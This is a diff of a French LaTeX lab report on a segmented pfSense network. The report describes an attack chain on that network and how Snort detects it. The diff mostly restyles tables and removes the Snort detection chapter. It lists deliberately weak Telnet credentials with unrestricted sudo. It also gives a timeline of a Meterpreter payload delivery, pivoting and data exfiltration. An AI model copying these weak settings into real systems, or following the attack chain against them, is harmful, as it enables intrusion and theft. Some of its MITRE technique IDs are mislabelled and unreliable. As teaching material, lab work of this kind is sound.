@@ -364,27 +364,28 @@
 	
 	\begin{table}[H]
 		\centering
-		\renewcommand{\arraystretch}{1.6}
-		\setlength{\arrayrulewidth}{0.5pt}
-		\begin{tabular}{>{\centering\arraybackslash}p{1.3cm} p{4.2cm} p{7.5cm}}
+		\renewcommand{\arraystretch}{1.8}
+		\setlength{\tabcolsep}{10pt}
+		\setlength{\arrayrulewidth}{0.8pt}
+		\begin{tabularx}{\textwidth}{|>{\centering\arraybackslash\bfseries}p{1.5cm}|p{4.2cm}|X|}
 			\arrayrulecolor{tableborder}
 			\hline
-			\tableheadcolor
-			\textcolor{tableheadfg}{\textbf{Phase}}   &
-			\textcolor{tableheadfg}{\textbf{Domaine}} &
-			\textcolor{tableheadfg}{\textbf{Objectifs Clés}}                                                                                                        \\
+			\rowcolor{tableheadbg}
+			\textcolor{white}{\textbf{Phase}}   &
+			\textcolor{white}{\textbf{Domaine}} &
+			\textcolor{white}{\textbf{Objectifs Clés}} \\
 			\hline
 			\rowcolor{tablerowalt}
-			\textbf{1}                                & Défense Périmétrique & Architecture réseau, pare-feu stateful, segmentation, IDS aperçu                     \\
-			
-			\textbf{2}                                & Reconnaissance       & Configuration services vulnérables, reconnaissance active (Nmap), surface d'attaque  \\
-			
-			\rowcolor{tablerowalt}
-			\textbf{3}                                & Attaque              & Exploitation initiale, post-exploitation Meterpreter, pivoting latéral, exfiltration \\
-			
-			\textbf{4}                                & Détection Active     & Snort IDS, analyse alertes, corrélation avec chaîne d'attaque, recommandations       \\
+			1 & Défense Périmétrique & Architecture réseau, pare-feu stateful, segmentation, IDS aperçu \\
 			\hline
-		\end{tabular}
+			2 & Reconnaissance       & Configuration services vulnérables, reconnaissance active (Nmap), surface d'attaque \\
+			\hline
+			\rowcolor{tablerowalt}
+			3 & Attaque              & Exploitation initiale, post-exploitation Meterpreter, pivoting latéral, exfiltration \\
+			\hline
+			4 & Détection Active     & Snort IDS, analyse alertes, corrélation avec chaîne d'attaque, recommandations \\
+			\hline
+		\end{tabularx}
 		\caption{Structure des quatre phases expérimentales}
 		\label{tab:phases-overview}
 	\end{table}
@@ -427,25 +428,26 @@ L'infrastructure de laboratoire s'organise en trois zones discrètes :
 
 \begin{table}[H]
 	\centering
-	\renewcommand{\arraystretch}{1.5}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\bfseries}p{2.2cm} p{4.5cm} p{6.3cm}}
+	\renewcommand{\arraystretch}{1.8}
+	\setlength{\tabcolsep}{10pt}
+	\setlength{\arrayrulewidth}{0.8pt}
+	\begin{tabularx}{\textwidth}{|>{\bfseries}p{2.2cm}|p{4.5cm}|X|}
 		\arrayrulecolor{tableborder}
 		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Zone}}     &
-		\textcolor{tableheadfg}{\textbf{Plage IP}} &
-		\textcolor{tableheadfg}{\textbf{Fonction}}                                                                                   \\
+		\rowcolor{tableheadbg}
+		\textcolor{white}{\textbf{Zone}}     &
+		\textcolor{white}{\textbf{Plage IP}} &
+		\textcolor{white}{\textbf{Fonction}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		\textbf{WAN}                               & 192.168.100.0/24 & Accès Internet (simulation externe), points d'attaque        \\
-
-		\textbf{DMZ}                               & 192.168.10.0/24  & Serveurs exposés (HTTP, services publics), zone risquée      \\
-
-		\rowcolor{tablerowalt}
-		\textbf{LAN}                               & 192.168.20.0/24  & Ressources internes (postes utilisateurs, BD), zone critique \\
+		WAN & 192.168.100.0/24 & Accès Internet (simulation externe), points d'attaque \\
 		\hline
-	\end{tabular}
+		DMZ & 192.168.10.0/24  & Serveurs exposés (HTTP, services publics), zone risquée \\
+		\hline
+		\rowcolor{tablerowalt}
+		LAN & 192.168.20.0/24  & Ressources internes (postes utilisateurs, BD), zone critique \\
+		\hline
+	\end{tabularx}
 	\caption{Organisation des zones réseau}
 	\label{tab:zones-network}
 \end{table}
@@ -454,25 +456,29 @@ L'infrastructure de laboratoire s'organise en trois zones discrètes :
 
 \begin{table}[H]
 	\centering
-	\renewcommand{\arraystretch}{1.4}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\bfseries}p{3.2cm} p{3cm} p{2.5cm} p{4.3cm}}
+	\renewcommand{\arraystretch}{1.8}
+	\setlength{\tabcolsep}{10pt}
+	\setlength{\arrayrulewidth}{0.8pt}
+	\begin{tabularx}{\textwidth}{|>{\bfseries}p{3.5cm}|>{\ttfamily}p{3.2cm}|>{\centering\arraybackslash}p{2.5cm}|X|}
 		\arrayrulecolor{tableborder}
 		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Machine}} &
-		\textcolor{tableheadfg}{\textbf{IP}}      &
-		\textcolor{tableheadfg}{\textbf{Zone}}    &
-		\textcolor{tableheadfg}{\textbf{Rôle}}                                                                     \\
+		\rowcolor{tableheadbg}
+		\textcolor{white}{\textbf{Machine}} &
+		\textcolor{white}{\textbf{Adresse IP}} &
+		\textcolor{white}{\textbf{Zone}} &
+		\textcolor{white}{\textbf{Rôle}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		pfSense (Routeur/FW)                      & 192.168.100.6 (WAN) & WAN/DMZ/LAN & Seg. réseau, filtrage, IDS \\
-		Ubuntu DMZ                                & 192.168.10.100      & DMZ         & Serveur exposé, pivot      \\
-		\rowcolor{tablerowalt}
-		Parrot Security                           & 192.168.100.150     & WAN         & Machine attaquante         \\
-		Windows XP                                & 192.168.20.50       & LAN         & Cible secondaire           \\
+		pfSense (Routeur/FW) & 192.168.100.6 & WAN/DMZ/LAN & Segmentation réseau, filtrage dynamique, IDS \\
 		\hline
-	\end{tabular}
+		Ubuntu DMZ & 192.168.10.100 & DMZ & Serveur exposé, pivot point pour mouvement latéral \\
+		\hline
+		\rowcolor{tablerowalt}
+		Parrot Security & 192.168.100.150 & WAN & Machine attaquante (reconnaissance, exploitation) \\
+		\hline
+		Windows XP & 192.168.20.50 & LAN & Cible secondaire (pivoting, post-exploitation) \\
+		\hline
+	\end{tabularx}
 	\caption{Inventaire des équipements virtuels}
 	\label{tab:equipment-inventory}
 \end{table}
@@ -501,42 +507,31 @@ Pour exposer les services du serveur DMZ, des règles NAT permettent de redirige
 
 \begin{table}[H]
 	\centering
-	\renewcommand{\arraystretch}{2}
-	\setlength{\tabcolsep}{12pt}
-	\setlength{\arrayrulewidth}{1pt}
-	\begin{tabularx}{\textwidth}{|>{\raggedright\arraybackslash\bfseries}p{2cm}|>{\raggedright\arraybackslash}p{2.2cm}|>{\centering\arraybackslash}p{1.8cm}|X|}
+	\renewcommand{\arraystretch}{1.8}
+	\setlength{\tabcolsep}{10pt}
+	\setlength{\arrayrulewidth}{0.8pt}
+	\begin{tabularx}{\textwidth}{|>{\centering\arraybackslash}p{1.8cm}|>{\centering\arraybackslash}p{1.8cm}|>{\centering\arraybackslash}p{3.2cm}|X|}
+		\arrayrulecolor{tableborder}
 		\hline
-		\rowcolor{primary}
-		\textcolor{white}{\textbf{Machine}} & 
-		\textcolor{white}{\textbf{Adresse IP}} & 
-		\textcolor{white}{\textbf{Zone}} & 
-		\textcolor{white}{\textbf{Rôle}} \\
-		\hline
-		\rowcolor{tablerowalt}
-		pfSense (Routeur/FW) & 
-		192.168.100.6 & 
-		WAN/DMZ/LAN & 
-		Segmentation réseau, filtrage dynamique, IDS \\
-		\hline
-		Ubuntu DMZ & 
-		192.168.10.100 & 
-		DMZ & 
-		Serveur exposé, pivot point pour mouvement latéral \\
+		\rowcolor{tableheadbg}
+		\textcolor{white}{\textbf{Port}} &
+		\textcolor{white}{\textbf{Service}} &
+		\textcolor{white}{\textbf{Cible DMZ}} &
+		\textcolor{white}{\textbf{Justification}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		Parrot Security & 
-		192.168.100.150 & 
-		WAN & 
-		Machine attaquante (reconnaissance, exploitation) \\
+		23/TCP & Telnet & 192.168.10.100:23 & Service d'accès distant (legacy, protocole non chiffré) \\
 		\hline
-		Windows XP & 
-		192.168.20.50 & 
-		LAN & 
-		Cible secondaire (pivoting, post-exploitation) \\
+		80/TCP & HTTP & 192.168.10.100:80 & Serveur web (DVWA, vulnérable intentionnellement) \\
+		\hline
+		\rowcolor{tablerowalt}
+		139/TCP & NetBIOS & 192.168.10.100:139 & Partage de fichiers Samba (réseau local) \\
+		\hline
+		445/TCP & SMB & 192.168.10.100:445 & Partage de fichiers moderne (protocole SMB/Samba) \\
 		\hline
 	\end{tabularx}
-	\caption{Inventaire des équipements virtuels}
-	\label{tab:equipment-inventory}
+	\caption{Règles NAT : exposition sélective de services DMZ}
+	\label{tab:nat-rules}
 \end{table}
 
 Chaque règle NAT est associée à une règle pare-feu autorisant le trafic sur l'interface WAN. Sans cette association, les connexions seraient bloquées malgré la règle NAT.
@@ -700,25 +695,26 @@ Les scans ont été exécutés depuis la machine Parrot (WAN), simulant un attaq
 
 \begin{table}[H]
 	\centering
-	\renewcommand{\arraystretch}{1.5}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\bfseries}p{2cm} p{4cm} p{6cm}}
+	\renewcommand{\arraystretch}{1.8}
+	\setlength{\tabcolsep}{10pt}
+	\setlength{\arrayrulewidth}{0.8pt}
+	\begin{tabularx}{\textwidth}{|>{\bfseries}p{2.2cm}|p{4.5cm}|X|}
 		\arrayrulecolor{tableborder}
 		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{État}}          &
-		\textcolor{tableheadfg}{\textbf{Signification}} &
-		\textcolor{tableheadfg}{\textbf{Implication Sécurité}}                                                                                                                          \\
+		\rowcolor{tableheadbg}
+		\textcolor{white}{\textbf{État}}          &
+		\textcolor{white}{\textbf{Signification}} &
+		\textcolor{white}{\textbf{Implication Sécurité}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		\textbf{open}                                   & Port accessible, service en écoute  & \textcolor{success}{\checkmark} \textit{Point d'attaque} — vecteur d'exploitation       \\
-
-		\textbf{closed}                                 & Port accessible mais pas de service & \textcolor{warning}{\warningsymbol}️ Service peut être activé, révèle politique firewall \\
-
-		\rowcolor{tablerowalt}
-		\textbf{filtered}                               & Pare-feu bloque (timeout)           & \textcolor{success}{\bullet} Protection active, service masqué                          \\
+		open     & Port accessible, service en écoute  & \textcolor{success}{\checkmark} \textit{Point d'attaque} — vecteur d'exploitation \\
 		\hline
-	\end{tabular}
+		closed   & Port accessible mais pas de service & \textcolor{warning}{\warningsymbol} Service peut être activé, révèle politique firewall \\
+		\hline
+		\rowcolor{tablerowalt}
+		filtered & Pare-feu bloque (timeout)           & \textcolor{success}{\bullet} Protection active, service masqué \\
+		\hline
+	\end{tabularx}
 	\caption{États de port Nmap et implications}
 	\label{tab:nmap-states}
 \end{table}
@@ -857,19 +853,26 @@ Le service Telnet a été configuré avec des credentials intentionnellement fai
 
 \begin{table}[H]
 	\centering
-	\renewcommand{\arraystretch}{1.3}
-	\begin{tabular}{>{\bfseries}p{3cm} p{5cm}}
+	\renewcommand{\arraystretch}{1.8}
+	\setlength{\tabcolsep}{10pt}
+	\setlength{\arrayrulewidth}{0.8pt}
+	\begin{tabularx}{\textwidth}{|>{\bfseries}p{4cm}|X|}
+		\arrayrulecolor{tableborder}
 		\hline
-		\textcolor{tableheadfg}{\textbf{Paramètre}} & \textcolor{tableheadfg}{\textbf{Valeur}} \\
+		\rowcolor{tableheadbg}
+		\textcolor{white}{\textbf{Paramètre}} & \textcolor{white}{\textbf{Valeur}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		Utilisateur                                 & telnetuser                               \\
-		Mot de passe                                & test123                                  \\
-		\rowcolor{tablerowalt}
-		Privilèges                                  & sudo ALL (sans restriction)              \\
-		Service                                     & Telnet (port 23, inetd)                  \\
+		Utilisateur  & telnetuser \\
 		\hline
-	\end{tabular}
+		Mot de passe & test123 \\
+		\hline
+		\rowcolor{tablerowalt}
+		Privilèges   & sudo ALL (sans restriction) \\
+		\hline
+		Service      & Telnet (port 23, inetd) \\
+		\hline
+	\end{tabularx}
 	\caption{Credentials Telnet et Configuration Vulnérable}
 	\label{tab:telnet-creds}
 \end{table}
@@ -1165,54 +1168,53 @@ Dans les connexions actives, les sessions Meterpreter en cours d'exécution sont
 \begin{table}[H]
 	\centering
 	\small
-	\renewcommand{\arraystretch}{1.3}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\centering\arraybackslash}p{2cm} p{3.5cm} p{6.5cm}}
+	\renewcommand{\arraystretch}{1.8}
+	\setlength{\tabcolsep}{10pt}
+	\setlength{\arrayrulewidth}{0.8pt}
+	\begin{tabularx}{\textwidth}{|>{\centering\arraybackslash}p{2.2cm}|p{3.8cm}|X|}
 		\arrayrulecolor{tableborder}
 		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Heure}} &
-		\textcolor{tableheadfg}{\textbf{Phase}} &
-		\textcolor{tableheadfg}{\textbf{Action}}                                                                                          \\
+		\rowcolor{tableheadbg}
+		\textcolor{white}{\textbf{Heure}} &
+		\textcolor{white}{\textbf{Phase}} &
+		\textcolor{white}{\textbf{Action}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		15:08                                   & Reconnaissance       & Scan Nmap complet (1000 ports) identifie Telnet et HTTP          \\
-
-		\rowcolor{tablerowalt}
-		15:08:30                                & Initial Access       & Connexion Telnet réussie (telnetuser:test123)                    \\
-
-		15:09                                   & Privilege Escalation & Découverte sudo ALL, élévation vers root                         \\
-
-		\rowcolor{tablerowalt}
-		15:09:15                                & Weaponization        & Génération payload meterpreter.elf (250 bytes)                   \\
-
-		15:09:30                                & Delivery             & Téléchargement via wget HTTP:8000                                \\
-
-		\rowcolor{tablerowalt}
-		15:09:45                                & Exploitation         & Exécution payload, session Meterpreter établie (PID 4779)        \\
-
-		15:10                                   & C2 Established       & Handler accepte connexion inverse sur 4445/TCP                   \\
-
-		\rowcolor{tablerowalt}
-		15:15                                   & Persistence          & Configuration 2 sessions Meterpreter (PID 4907, 4908)            \\
-
-		15:20                                   & Lateral Movement     & Route Metasploit vers 192.168.20.0/24 (LAN) via pivot            \\
-
-		\rowcolor{tablerowalt}
-		15:25                                   & Discovery            & Scan SMB/RDP détecte Windows XP:445 via pivot                    \\
-
-		15:28                                   & Reconnaissance       & Empreinte OS confirme Windows XP SP3                             \\
-
-		\rowcolor{tablerowalt}
-		15:30                                   & Exploitation Tentée  & MS08-067 / MS17-010 échouent (patches appliqués)                 \\
-
-		15:35                                   & Intelligence         & Modules post-exploitation : 121 KB exfiltrés (43 users, configs) \\
-
-		\rowcolor{tablerowalt}
-		15:40                                   & Tunneling            & Port forwarding RDP 3389 établi via Meterpreter                  \\
-
+		15:08    & Reconnaissance       & Scan Nmap complet (1000 ports) identifie Telnet et HTTP \\
 		\hline
-	\end{tabular}
+		15:08:30 & Initial Access       & Connexion Telnet réussie (telnetuser:test123) \\
+		\hline
+		\rowcolor{tablerowalt}
+		15:09    & Privilege Escalation & Découverte sudo ALL, élévation vers root \\
+		\hline
+		15:09:15 & Weaponization        & Génération payload meterpreter.elf (250 bytes) \\
+		\hline
+		\rowcolor{tablerowalt}
+		15:09:30 & Delivery             & Téléchargement via wget HTTP:8000 \\
+		\hline
+		15:09:45 & Exploitation         & Exécution payload, session Meterpreter établie (PID 4779) \\
+		\hline
+		\rowcolor{tablerowalt}
+		15:10    & C2 Established       & Handler accepte connexion inverse sur 4445/TCP \\
+		\hline
+		15:15    & Persistence          & Configuration 2 sessions Meterpreter (PID 4907, 4908) \\
+		\hline
+		\rowcolor{tablerowalt}
+		15:20    & Lateral Movement     & Route Metasploit vers 192.168.20.0/24 (LAN) via pivot \\
+		\hline
+		15:25    & Discovery            & Scan SMB/RDP détecte Windows XP:445 via pivot \\
+		\hline
+		\rowcolor{tablerowalt}
+		15:28    & Reconnaissance       & Empreinte OS confirme Windows XP SP3 \\
+		\hline
+		15:30    & Exploitation Tentée  & MS08-067 / MS17-010 échouent (patches appliqués) \\
+		\hline
+		\rowcolor{tablerowalt}
+		15:35    & Intelligence         & Modules post-exploitation : 121 KB exfiltrés (43 users, configs) \\
+		\hline
+		15:40    & Tunneling            & Port forwarding RDP 3389 établi via Meterpreter \\
+		\hline
+	\end{tabularx}
 	\caption{Timeline complète : 32 minutes de compromission progressive}
 	\label{tab:attack-timeline}
 \end{table}
@@ -1226,45 +1228,46 @@ Les techniques employées au cours de cette chaîne d'attaque correspondent à u
 \begin{table}[H]
 	\centering
 	\small
-	\renewcommand{\arraystretch}{1.3}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\ttfamily}p{2.8cm} p{4cm} p{6.2cm}}
+	\renewcommand{\arraystretch}{1.8}
+	\setlength{\tabcolsep}{10pt}
+	\setlength{\arrayrulewidth}{0.8pt}
+	\begin{tabularx}{\textwidth}{|>{\ttfamily}p{3.2cm}|p{2.8cm}|X|}
 		\arrayrulecolor{tableborder}
 		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Tactic}} &
-		\textcolor{tableheadfg}{\textbf{ID}}     &
-		\textcolor{tableheadfg}{\textbf{Description}}                                                                 \\
+		\rowcolor{tableheadbg}
+		\textcolor{white}{\textbf{Tactic}} &
+		\textcolor{white}{\textbf{ID}}     &
+		\textcolor{white}{\textbf{Description}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		Reconnaissance                           & T1592     & Gather Victim Host Information (Nmap)                  \\
-
-		Initial Access                           & T1078     & Valid Accounts (Telnet credentials)                    \\
-
-		\rowcolor{tablerowalt}
-		Execution                                & T1059.004 & Command \& Scripting Interpreter (Unix Shell)          \\
-
-		Privilege Escalation                     & T1548.003 & Sudo and Sudo Caching (escalation vers root)           \\
-
-		\rowcolor{tablerowalt}
-		Defense Evasion                          & T1197     & Encrypted Tunnel (Meterpreter TLS)                     \\
-
-		Discovery                                & T1018     & Remote System Discovery (scan SMB via pivot)           \\
-
-		\rowcolor{tablerowalt}
-		Lateral Movement                         & T1021.006 & Windows Remote Management (SMB/RDP tentatives)         \\
-
-		Collection                               & T1005     & Data from Local System (enumeration post-exploitation) \\
-
-		\rowcolor{tablerowalt}
-		Exfiltration                             & T1041     & Exfiltration Over C2 Channel (121 KB via Meterpreter)  \\
-
-		Command \& Control                       & T1071     & Application Layer Protocol (HTTP, TLS)                 \\
-
-		\rowcolor{tablerowalt}
-		Persistence                              & T1547     & Boot or Logon Autostart Execution (sessions multiples) \\
+		Reconnaissance    & T1592     & Gather Victim Host Information (Nmap) \\
 		\hline
-	\end{tabular}
+		Initial Access    & T1078     & Valid Accounts (Telnet credentials) \\
+		\hline
+		\rowcolor{tablerowalt}
+		Execution         & T1059.004 & Command \& Scripting Interpreter (Unix Shell) \\
+		\hline
+		Privilege Escalation & T1548.003 & Sudo and Sudo Caching (escalation vers root) \\
+		\hline
+		\rowcolor{tablerowalt}
+		Defense Evasion   & T1197     & Encrypted Tunnel (Meterpreter TLS) \\
+		\hline
+		Discovery         & T1018     & Remote System Discovery (scan SMB via pivot) \\
+		\hline
+		\rowcolor{tablerowalt}
+		Lateral Movement  & T1021.006 & Windows Remote Management (SMB/RDP tentatives) \\
+		\hline
+		Collection        & T1005     & Data from Local System (enumeration post-exploitation) \\
+		\hline
+		\rowcolor{tablerowalt}
+		Exfiltration      & T1041     & Exfiltration Over C2 Channel (121 KB via Meterpreter) \\
+		\hline
+		Command \& Control & T1071    & Application Layer Protocol (HTTP, TLS) \\
+		\hline
+		\rowcolor{tablerowalt}
+		Persistence       & T1547     & Boot or Logon Autostart Execution (sessions multiples) \\
+		\hline
+	\end{tabularx}
 	\caption{Techniques MITRE ATT\&CK : correspondance avec la chaîne d'attaque}
 	\label{tab:mitre-attack-techniques}
 \end{table}
@@ -1333,1305 +1336,35 @@ La segmentation DMZ/LAN a \textit{presque} arrêté le pivoting :
 \begin{table}[H]
 	\centering
 	\small
-	\renewcommand{\arraystretch}{1.4}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{2.5cm} >{\bfseries}p{2.5cm} p{7cm}}
+	\renewcommand{\arraystretch}{1.8}
+	\setlength{\tabcolsep}{10pt}
+	\setlength{\arrayrulewidth}{0.8pt}
+	\begin{tabularx}{\textwidth}{|p{2.8cm}|>{\bfseries}p{3.5cm}|X|}
 		\arrayrulecolor{tableborder}
 		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Couche}}       &
-		\textcolor{tableheadfg}{\textbf{Point Faible}} &
-		\textcolor{tableheadfg}{\textbf{Impact}}                                                                         \\
+		\rowcolor{tableheadbg}
+		\textcolor{white}{\textbf{Couche}}       &
+		\textcolor{white}{\textbf{Point Faible}} &
+		\textcolor{white}{\textbf{Impact}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		Périmètre                                      & Telnet exposé (port 23)       & Accès initial facile            \\
-
-		Authentification                               & Credentials faibles (test123) & Pas de bruteforce nécessaire    \\
-
-		\rowcolor{tablerowalt}
-		Escalade                                       & sudo ALL illimité             & Root instantané                 \\
-
-		Segmentation                                   & Règle DMZ→LAN permissive      & Pivoting possible               \\
-
-		\rowcolor{tablerowalt}
-		Détection                                      & Pas d'IDS/alerting            & Aucune visibilité C2            \\
-
-		Monitoring                                     & Fail2Ban non configuré Telnet & Pas de bannissement brute-force \\
+		Périmètre        & Telnet exposé (port 23)       & Accès initial facile \\
 		\hline
-	\end{tabular}
+		Authentification & Credentials faibles (test123) & Pas de bruteforce nécessaire \\
+		\hline
+		\rowcolor{tablerowalt}
+		Escalade         & sudo ALL illimité             & Root instantané \\
+		\hline
+		Segmentation     & Règle DMZ→LAN permissive      & Pivoting possible \\
+		\hline
+		\rowcolor{tablerowalt}
+		Détection        & Pas d'IDS/alerting            & Aucune visibilité C2 \\
+		\hline
+		Monitoring       & Fail2Ban non configuré Telnet & Pas de bannissement brute-force \\
+		\hline
+	\end{tabularx}
 	\caption{Synthèse des points faibles exploités dans chaque couche défensive}
 	\label{tab:weaknesses-exploited}
 \end{table}
-
-% ==============================================================================
-% CHAPITRE 4 : DÉFENSE ACTIVE - DÉTECTION DES MENACES
-% ==============================================================================
-\chapter{Détection Active avec Snort (IDS/IPS)}
-
-\section{Transition : du Déploiement à la Validation}
-
-Les chapitres précédents ont montré comment une infrastructure défensive peut être compromise via une chaîne d'attaque progressive. Ce chapitre inverse la perspective : comment aurait-on pu \textit{détecter} ces attaques en temps réel?
-
-La réponse réside dans la \textbf{détection active par inspection profonde de paquets (DPI)} via un système comme \textbf{Snort}.
-
-\section{Snort : Principes Fondamentaux}
-
-\subsection{Définition et Modes}
-
-\textbf{Snort} est un système de détection d'intrusions réseau (NIDS) gratuit et open-source qui :
-
-\begin{itemize}
-	\item Capture le trafic réseau en temps réel.
-	\item Analyse le contenu des paquets (couche applicative, couche 7 OSI).
-	\item Compare à une base de signatures (règles) pour identifier des motifs malveillants.
-	\item Génère des alertes ou bloque le trafic selon le mode.
-\end{itemize}
-
-\textbf{Deux modes d'opération :}
-
-\begin{description}
-	\item[Mode IDS] : Détection passive. Alerte sans intervention (recommandé en début de déploiement).
-	\item[Mode IPS] : Prévention active. Blocage du trafic malveillant identifié (plus risqué, nécessite tuning).
-\end{description}
-
-Dans ce projet, Snort fonctionne en \textbf{mode IDS} (alerting seul), permettant de collecter des données sans interruptions de service dues à des faux positifs.
-
-\subsection{Couverture Multi-Interfaces}
-
-Snort a été activé sur \textbf{trois interfaces} de pfSense :
-
-\begin{table}[H]
-	\centering
-	\renewcommand{\arraystretch}{1.4}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\bfseries}p{2.5cm} p{5.5cm} p{5cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Interface}}        &
-		\textcolor{tableheadfg}{\textbf{Trafic Surveillé}} &
-		\textcolor{tableheadfg}{\textbf{Détections Attendues}}                                                                        \\
-		\hline
-		\rowcolor{tablerowalt}
-		WAN (em0)                                          & Internet $\rightarrow$ pfSense   & Scans externes, payloads, C2          \\
-
-		DMZ (em1)                                          & DMZ $\leftrightarrow$ Services   & Services compromis, post-exploitation \\
-
-		\rowcolor{tablerowalt}
-		LAN (em2)                                          & LAN $\leftrightarrow$ Ressources & Mouvement latéral, exploits internes  \\
-		\hline
-	\end{tabular}
-	\caption{Interfaces Snort et trafic surveillé}
-	\label{tab:snort-interfaces-coverage}
-\end{table}
-
-\section{Sources de Signatures}
-
-\subsection{Snort GPLv2 Community Rules}
-
-\begin{itemize}
-	\item \textbf{Éditeur :} Talos Intelligence (groupe de recherche Cisco)
-	\item \textbf{Couverture :} ~3000 signatures certifiées
-	\item \textbf{Focus :} Exploits courants, malwares connus
-	\item \textbf{Licence :} GPLv2 (open-source, gratuit)
-	\item \textbf{Mise à jour :} Hebdomadaire
-\end{itemize}
-
-\subsection{Emerging Threats Open (ET Open)}
-
-\begin{itemize}
-	\item \textbf{Éditeur :} Proofpoint (anciennement Emergingthreats.net)
-	\item \textbf{Couverture :} ~30 000 signatures additionnelles
-	\item \textbf{Focus :} Vulnérabilités récentes, 0-days, APTs
-	\item \textbf{Licence :} MIT (gratuit, permissif)
-	\item \textbf{Mise à jour :} Quotidienne
-\end{itemize}
-
-La combinaison de ces deux sources offre une couverture large et actualisée des menaces.
-
-\section{Configuration et Activation}
-
-\subsection{Déploiement sur pfSense}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Installation du paquet :} System $\rightarrow$ Package Manager $\rightarrow$ Snort
-	\item \textbf{Activation des sources :} Services $\rightarrow$ Snort $\rightarrow$ Global Settings $\rightarrow$ Sélectionner ET Open + GPLv2
-	\item \textbf{Activation par interface :} Services $\rightarrow$ Snort $\rightarrow$ Interfaces $\rightarrow$ Edit (WAN/DMZ/LAN)
-	\item \textbf{Mode :} IDS (Blocking Mode : OFF)
-	\item \textbf{Apply :} Démarrage des instances Snort
-\end{enumerate}
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{screenshots/snort-global-settings.png}
-	\caption{Snort Global Settings: rules sources and IDS policy configuration}
-	\label{fig:snort-global-settings}
-\end{figure}
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{screenshots/snort-interfaces.png}
-	\caption{Snort IDS Configuration on WAN/DMZ/LAN interfaces (IDS mode)}
-	\label{fig:snort-interfaces-config}
-\end{figure}
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{screenshots/snort-interfaces-running.png}
-	\caption{Snort IDS Configuration on WAN/DMZ/LAN interfaces (IDS mode)}
-	\label{fig:snort-interfaces-active}
-\end{figure}
-
-\section{Détection en Temps Réel : Alertes Observées}
-
-\subsection{Alerte WAN \#1 : Transfert de Payload ELF}
-
-Au moment où le binaire meterpreter.elf est téléchargé, Snort déclenche une alerte :
-
-\begin{lstlisting}[style=logstyle,caption=Alerte WAN : detection executable ELF download]
-Alert Time: 2026-03-14 22:21:02
-Interface: WAN (em0)
-Priority: 1 (Critical)
-Protocol: TCP
-Class: Potential Corporate Privacy Violation
-
-Source IP:Port: 192.168.100.150:4445
-Dest IP:Port: 192.168.100.6:19767
-
-GID:SID: 1:2000418
-Message: ET POLICY Executable and linking format (ELF) file download
-\end{lstlisting}
-
-\textbf{Interprétation :}
-\begin{itemize}
-	\item \textbf{SID 1:2000418} identifie une signature Emerging Threats.
-	\item \textbf{ET POLICY} indique une violation de politique (transfert de binaire).
-	\item \textbf{Source 192.168.100.150} = attaquant Parrot
-	\item \textbf{Dest 192.168.100.6:19767} = trafic intra-réseau local (HTTP upload simulé)
-	\item \textbf{Signature} : Snort a reconnu les magic bytes ELF (\texttt{0x7F 0x45 0x4C 0x46})
-\end{itemize}
-
-\textcolor{success}{\checkmark} \textbf{Détection réussie} : Snort a identifié le transfert du payload malveillant avant son exécution.
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{screenshots/wan-alerts.png}
-	\caption{WAN interface alerts}
-	\label{fig:wan-alerts-capture}
-\end{figure}
-
-\subsection{Alerte LAN \#2 : Sonde MS17-010 (EternalBlue)}
-
-Lors de la tentative d'exploitation MS17-010, Snort déclenche une alerte interne :
-
-\begin{lstlisting}[style=logstyle,caption=Alerte LAN : detection MS17-010 EternalBlue probe]
-Alert Time: 2026-03-04 15:28:14
-Interface: LAN (em2)
-Priority: 1 (Critical)
-Protocol: TCP
-Class: A Network Trojan was Detected
-
-Source IP:Port: 192.168.10.100:44152
-Dest IP:Port: 192.168.20.50:445
-
-GID:SID: 1:2025992
-Message: ET EXPLOIT Possible ETERNALBLUE Probe MS17-010 (Generic Flags)
-\end{lstlisting}
-
-\textbf{Interprétation Critique :}
-\begin{itemize}
-	\item \textbf{Source 192.168.10.100} = serveur DMZ compromis (pivot)
-	\item \textbf{Dest 192.168.20.50:445} = Windows XP (cible secondaire SMB)
-	\item \textbf{Signature} : Détecte les flags TCP et séquences typiques d'une sonde EternalBlue
-	\item \textbf{Classification} : "Network Trojan" = activité fortement suspecte
-\end{itemize}
-
-\textbf{Apport Défensif Majeur :}
-
-Le pare-feu, lui, voyait simplement : "flux TCP DMZ→LAN:445 AUTORISÉ selon règles". Snort, en revanche, analyse le contenu et reconnaît le pattern d'une tentative d'exploitation, fournissant un \textbf{contexte d'attaque} indispensable.
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{screenshots/snort-alerts-lan.png}
-	\caption{Real Snort IDS Alerts: ELF payload detection + MS17-010 probe}
-	\label{fig:snort-alerts-lan-capture}
-\end{figure}
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.95\textwidth]{screenshots/lan-alerts.png}
